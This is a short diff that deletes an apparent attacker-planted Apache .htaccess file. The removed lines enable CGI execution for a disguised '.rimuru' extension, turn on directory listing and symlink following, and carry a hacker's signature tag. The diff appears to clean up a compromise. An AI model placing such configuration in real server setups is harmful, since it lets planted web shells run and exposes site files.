@@ -1,4 +1,0 @@
-#ReCoded By 7x1337
-Options FollowSymLinks MultiViews Indexes ExecCGI
-AddType application/x-httpd-cgi .rimuru
-AddHandler cgi-script .rimuru
